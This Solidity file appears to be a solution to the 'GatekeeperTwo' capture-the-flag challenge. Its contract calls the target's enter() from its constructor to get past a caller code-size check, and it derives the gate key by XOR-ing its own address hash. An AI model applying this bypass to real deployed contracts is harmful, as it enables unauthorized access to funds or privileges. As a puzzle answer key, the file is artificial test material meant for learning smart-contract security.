// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoSolution {
    constructor(address _gatekeeper) {
        GatekeeperTwo gatekeeper = GatekeeperTwo(_gatekeeper);
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF);
        gatekeeper.enter(gateKey);
    }
}